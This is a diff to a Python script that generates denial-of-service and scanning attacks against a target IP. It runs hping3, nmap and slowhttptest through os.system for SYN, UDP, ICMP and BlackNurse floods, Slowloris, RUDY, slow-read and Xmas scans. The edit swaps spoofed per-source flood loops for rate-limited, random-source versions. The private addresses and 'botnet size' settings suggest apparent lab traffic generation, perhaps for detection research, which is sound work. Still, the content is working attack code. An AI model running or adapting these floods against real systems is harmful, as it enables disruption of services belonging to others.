@@ -4,7 +4,7 @@ import random
 import ipaddress
 
 # Target Machine
-VICTIM_IP = "192.168.50.10"  # Replace with actual target IP
+VICTIM_IP = "192.168.20.10"  # Replace with actual target IP
 
 # Botnet Size Range
 BOTNET_SIZE_RANGE = [50, 171, 233, 340, 500]  
@@ -25,7 +25,7 @@ ATTACK_PORTS = {
 def generate_botnet_ips(start_ip, botnet_size):
     return [str(ipaddress.ip_address(start_ip) + x) for x in range(botnet_size)]
 
-# Attack functions (Each attack sends to its assigned port)
+#Attack functions (Each attack sends to its assigned port)
 def slow_read():
     os.system(f"slowhttptest -B -c 1000 -X -g -r 5 -l 300 -u http://{VICTIM_IP}:{ATTACK_PORTS['slow_read']}")
 
@@ -33,25 +33,54 @@ def rudy():
     os.system(f"slowhttptest -R -c 500 -H -u http://{VICTIM_IP}:{ATTACK_PORTS['rudy']} -l 300")
 
 def ping_flood(botnet_size):
-    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
-        os.system(f"hping3 -1 --flood --spoof {ip} {VICTIM_IP} -p {ATTACK_PORTS['ping_flood']}")
+    os.system(
+        f"hping3 -1 -i u{max(10, 10000 // botnet_size)} "
+        f"-c {botnet_size * 20} --rand-source {VICTIM_IP} "
+        f"-p {ATTACK_PORTS['ping_flood']}"
+    )
+
 
 def blacknurse(botnet_size, short=False):
     duration = 30 if short else 120
-    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
-        os.system(f"hping3 --icmp --icmptype 3 --icmpcode 3 -d 1400 -i u1 -c {duration} --spoof {ip} {VICTIM_IP} -p {ATTACK_PORTS['blacknurse']}")
+    interval = max(10, 10000 // botnet_size)
+
+    os.system(
+        f"timeout {duration} hping3 --icmp --icmptype 3 --icmpcode 3 "
+        f"-d 1400 -i u{interval} {VICTIM_IP} "
+        f"-p {ATTACK_PORTS['blacknurse']}"
+    )
+
+
+
 
 def xmas_scan(botnet_size):
-    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
-        os.system(f"nmap -sX -S {ip} {VICTIM_IP} -p {ATTACK_PORTS['xmas_scan']}")
+    # No timeout needed — nmap handles timing
+    os.system(
+        f"nmap -sX -e eth1 -T4 --min-hostgroup {botnet_size} "
+        f"--max-parallelism {botnet_size} "
+        f"{VICTIM_IP} -p {ATTACK_PORTS['xmas_scan']}"
+    )
+
 
 def udp_flood(botnet_size):
-    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
-        os.system(f"hping3 --udp --flood --rand-source --spoof {ip} {VICTIM_IP} -p {ATTACK_PORTS['udp_flood']}")
+    duration = 60
+    interval = max(10, 10000 // botnet_size)
+
+    os.system(
+        f"timeout {duration} hping3 --udp -i u{interval} "
+        f"{VICTIM_IP} -p {ATTACK_PORTS['udp_flood']}"
+    )
+
+
 
 def syn_flood(botnet_size):
-    for ip in generate_botnet_ips("192.168.40.1", botnet_size):
-        os.system(f"hping3 -S --flood --rand-source -p {ATTACK_PORTS['syn_flood']} --spoof {ip} {VICTIM_IP}")
+    packet_count = botnet_size * 100
+    interval = max(10, 10000 // botnet_size)
+    os.system(
+        f"hping3 -S -i u{interval} -c {packet_count} "
+        f"{VICTIM_IP} -p {ATTACK_PORTS['syn_flood']}"
+    )
+
 
 def slowloris():
     os.system(f"slowhttptest -c 1000 -H -g -o slowloris_test -u http://{VICTIM_IP}:{ATTACK_PORTS['slowloris']} -r 50 -l 300")
@@ -69,7 +98,7 @@ ATTACKS = [
 ]
 
 # Run each attack 4 times with different botnet sizes
-for i in range(4):
+for i in range(2):
     print(f"--- Starting Attack Round {i+1} ---")
     for label, attack in ATTACKS:
         botnet_size = random.choice(BOTNET_SIZE_RANGE)  # Randomize botnet size
